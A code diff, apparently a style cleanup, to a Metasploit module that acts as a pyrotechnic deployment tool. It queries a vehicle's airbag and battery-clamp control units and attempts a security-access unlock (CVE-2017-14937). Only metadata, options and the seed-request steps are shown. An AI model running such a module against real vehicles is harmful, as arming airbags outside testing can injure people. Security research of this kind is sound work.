@@ -10,29 +10,33 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Hardware::Automotive::UDS
   include Msf::Post::Hardware::Automotive::DTC
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)',
-        'Description'   => %q{ Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module
-                               will first query all Pyrotechnic Control Units (PCUs) in the target vehicle
-                               to discover how many pyrotechnic devices are present, then attempt to validate
-                               the security access token using the default simplified algorithm.  On success,
-                               the vehicle will be in a state that is prepped to deploy its pyrotechnic devices
-                               (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021) },
-        'License'       => MSF_LICENSE,
-        'Author'        => [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)',
+        'Description' => %q{
+          Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module
+          will first query all Pyrotechnic Control Units (PCUs) in the target vehicle
+          to discover how many pyrotechnic devices are present, then attempt to validate
+          the security access token using the default simplified algorithm.  On success,
+          the vehicle will be in a state that is prepped to deploy its pyrotechnic devices
+          (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Johannes Braun',    # original research
           'Juergen Duerrwang', # original research
           'Craig Smith'        # research and module author
         ],
-        'References'    =>
-          [
-            [ 'CVE', '2017-14937' ],
-            [ 'URL', 'https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts' ]
-          ],
-        'Platform'      => ['hardware'],
-        'SessionTypes'  => ['hwbridge']
-      ))
+        'References' => [
+          [ 'CVE', '2017-14937' ],
+          [ 'URL', 'https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts' ]
+        ],
+        'Platform' => ['hardware'],
+        'SessionTypes' => ['hwbridge']
+      )
+    )
     register_options([
       OptInt.new('SRCID', [true, 'Module ID to query', 0x7f1]),
       OptInt.new('DSTID', [false, 'Expected reponse ID, defaults to SRCID + 8', 0x7f9]),
@@ -213,6 +217,7 @@ class MetasploitModule < Msf::Post
 
   def print_vin(vin)
     return "" if vin.nil?
+
     vin.map! { |d| d.hex.chr }
     print_status(" VIN: #{vin.join}")
   end
@@ -270,8 +275,8 @@ class MetasploitModule < Msf::Post
     print_status('Getting Security Access Seed...')
     seed = get_security_token(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x5F, opt)
     if seed.key? 'error'
-       print_error("Couldn't get seed: #{seed['error']}")
-       return
+      print_error("Couldn't get seed: #{seed['error']}")
+      return
     end
     print_status("Success.  Seed: #{seed['SEED']}")
     print_status('Attempting to unlock device...')
